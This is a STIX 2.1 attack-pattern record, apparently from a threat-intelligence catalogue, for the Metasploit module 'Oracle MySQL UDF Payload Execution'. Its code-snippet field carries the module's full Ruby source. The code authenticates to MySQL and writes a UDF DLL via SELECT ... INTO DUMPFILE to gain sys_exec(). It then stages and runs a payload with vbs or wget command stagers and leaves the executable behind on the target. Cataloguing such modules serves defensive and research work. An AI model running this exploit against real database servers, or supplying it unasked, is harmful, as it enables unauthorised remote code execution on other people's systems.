{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--494c208f-1f1d-491c-95b6-a70ad3eb5da2",
    "created": "2024-08-14T17:11:56.204394Z",
    "modified": "2024-08-14T17:11:56.204398Z",
    "name": "Oracle MySQL UDF Payload Execution",
    "description": " This module creates and enables a custom UDF (user defined function) on the target host via the SELECT ... into DUMPFILE method of binary injection. On default Microsoft Windows installations of MySQL (=< 5.5.9), directory write permissions not enforced, and the MySQL service runs as LocalSystem.  NOTE: This module will leave a payload executable on the target system when the attack is finished, as well as the UDF DLL, and will define or redefine sys_eval() and sys_exec() functions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/mysql/mysql_udf_payload.rb",
            "external_id": "mysql_udf_payload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MYSQL\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Oracle MySQL UDF Payload Execution',\n        'Description'    => %q{\n          This module creates and enables a custom UDF (user defined function) on the\n          target host via the SELECT ... into DUMPFILE method of binary injection. On\n          default Microsoft Windows installations of MySQL (=< 5.5.9), directory write\n          permissions not enforced, and the MySQL service runs as LocalSystem.\n\n          NOTE: This module will leave a payload executable on the target system when the\n          attack is finished, as well as the UDF DLL, and will define or redefine sys_eval()\n          and sys_exec() functions.\n        },\n        'Author'         =>\n          [\n            'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>', # the lib_mysqludf_sys.dll binaries\n            'todb', # this Metasploit module\n            'h00die' # linux addition\n          ],\n        'License'        => MSF_LICENSE,\n        'References'     =>\n          [\n            # Bernardo's work with cmd exec via udf\n            [ 'URL', 'http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html' ]\n          ],\n        'Platform'       => ['win', 'linux'],\n        'Targets'        =>\n          [\n            [ 'Windows', {'CmdStagerFlavor' => 'vbs'} ], # Confirmed on MySQL 4.1.22, 5.5.9, and 5.1.56 (64bit)\n            [ 'Linux', {'CmdStagerFlavor' => 'wget' } ]\n          ],\n        'DefaultTarget'  => 0,\n        'DisclosureDate' => '2009-01-16' # Date of Bernardo's blog post.\n    ))\n    register_options(\n      [\n        OptBool.new('FORCE_UDF_UPLOAD', [ false, 'Always attempt to install a sys_exec() mysql.function.', false ]),\n        OptString.new('USERNAME', [ false, 'The username to authenticate as', 'root' ])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def login_and_get_sys_exec\n    m = mysql_login(username,password,'mysql')\n    return if not m\n    @mysql_arch = mysql_get_arch\n    @mysql_sys_exec_available = mysql_check_for_sys_exec()\n    if !@mysql_sys_exec_available || datastore['FORCE_UDF_UPLOAD']\n      mysql_add_sys_exec\n      @mysql_sys_exec_available = mysql_check_for_sys_exec()\n    else\n      print_status \"sys_exec() already available, using that (override with FORCE_UDF_UPLOAD).\"\n    end\n\n    return m\n  end\n\n  def execute_command(cmd, opts)\n    mysql_sys_exec(cmd, datastore['VERBOSE'])\n  end\n\n  def exploit\n    m = login_and_get_sys_exec()\n\n    if not m\n      return\n    elsif not [:win32,:win64,:linux64,:linux32].include?(@mysql_arch)\n      print_status(\"Incompatible MySQL target architecture: '#{@mysql_arch}'\")\n      return\n    else\n      if @mysql_sys_exec_available\n        execute_cmdstager({:linemax => 1500, :nodelete => true})\n        handler\n      else\n        print_status(\"MySQL function sys_exec() not available\")\n        return\n      end\n    end\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-01-16 # Date of Bernardos blog post.",
    "x_mitre_platforms": [
        "['win', 'linux']"
    ]
}